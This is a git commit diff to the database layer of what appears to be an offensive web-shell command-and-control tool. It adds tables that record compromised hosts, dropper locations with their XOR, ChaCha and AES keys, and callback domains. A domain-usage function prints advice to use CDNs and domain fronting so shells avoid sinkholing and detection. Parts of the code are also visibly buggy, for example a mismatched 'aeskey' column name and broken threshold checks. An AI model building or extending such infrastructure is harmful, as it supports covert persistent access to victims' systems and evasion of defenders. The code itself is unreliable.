f85c67b390315f0259cefd6aa610f280ceb68f78
oldkingcone <11233163+oldkingcone@users.noreply.github.com>
2021-06-18 21:03:08 -0400

    :smile_cat:
    adding way to add in generated shells, their call back durations/timers, and associated keys. Will add these in as an authentication method in order for the shell to work.

--- includes/db/postgres_checker.php
+++ includes/db/postgres_checker.php
@@ -47,9 +47,9 @@ class postgres_checker
                 pg_exec($this->init_conn(), sprintf("CREATE ROLE sloppy_bot WITH LOGIN ENCRYPTED PASSWORD '%s'", $p));
                 pg_exec($this->init_conn(), sprintf("GRANT ALL ON ALL TABLES IN SCHEMA public TO %s", get_current_user()));
                 pg_exec($this->init_conn(), "GRANT INSERT,UPDATE,SELECT ON sloppy_bots_main,sloppy_bots_droppers,sloppy_bots_domains TABLES IN SCHEMA public TO sloppy_bot");
-                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT, uri TEXT, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-')");
-                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT, level TEXT, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0)");
-                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0)");
+                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-')");
+                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, depth TEXT NOT NULL, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0, chachakey TEXT UNIQUE NOT NULL DEFAULT '-', aeskeys TEXT UNIQUE NOT NULL DEFAULT '-', xorkey TEXT NOT NULL UNIQUE DEFAULT '-')");
+                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0, domain TEXT UNIQUE NOT NULL DEFAULT '-')");
                 // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                 pg_exec($this->init_conn(), "COMMIT");
             } catch (Exception $ex) {
@@ -126,13 +126,50 @@ class postgres_checker
         }
     }
 
-    function insertCreatedDropper(string $xorKey, string $chachaKey, string $aesKey, string $whereWeStored)
+    function insertCreatedDropper(string $xorKey, string $chachaKey, string $aesKey, string $whereWeStored, string $checkin, string $obfuscated, string $depth)
     {
+        if (!empty($xorKey) && !empty($chachaKey) && !empty($aesKey) && !empty($whereWeStored)) {
+            try {
+                pg_exec($this->init_conn(), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, chachakey, aeskey, xorkey) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s')",
+                    pg_escape_string($whereWeStored),
+                    pg_escape_string($depth),
+                    pg_escape_string($obfuscated),
+                    pg_escape_string($checkin),
+                    pg_escape_string($chachaKey),
+                    pg_escape_string($aesKey),
+                    pg_escape_string($xorKey)
+                ));
+            }catch (Exception $dropperE){
+                echo $dropperE->getLine();
+                echo $dropperE->getTrace();
+                echo $dropperE->getTraceAsString();
+                echo $dropperE->getMessage();
+            }
+        }
 
     }
 
     function countUsedDomains(string $dom)
     {
-
+        if (!empty($dom)){
+            $usedDoms = pg_exec($this->init_conn(), sprintf("SELECT uses FROM sloppy_bots_domains WHERE domain = '%s'", pg_escape_string($dom)));
+            $dUses = pg_fetch_row($usedDoms);
+            if (strlen($dUses[0] > 3)){
+                print("Hey there, it looks like you have used this domain at least 3 times.\nIt would be very smart to use a CDN to avoid this domain being sinkholed.");
+                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_domains SET uses = '%d' WHERE domain = '%s'", $dUses[0]+1, pg_escape_string($dom)));
+                pg_exec($this->init_conn(), "COMMIT");
+                return $dom;
+            }else if ($dUses[0] > 10){
+                print("Look, I know that setting up CDN's can appear to be rough.\n but i promise you, its better to set up a CDN and domain front through that, than your shell being caught.\n");
+                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_domains SET uses = '%d' WHERE domain = '%s'", $dUses[0]+1, pg_escape_string($dom)));
+                pg_exec($this->init_conn(), "COMMIT");
+                return 0;
+            }else{
+                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_domains SET uses = '%d' WHERE domain = '%s'", 1, pg_escape_string($dom)));
+                pg_exec($this->init_conn(), "COMMIT");
+                return $dom;
+            }
+        }
+        return 0;
     }
 }
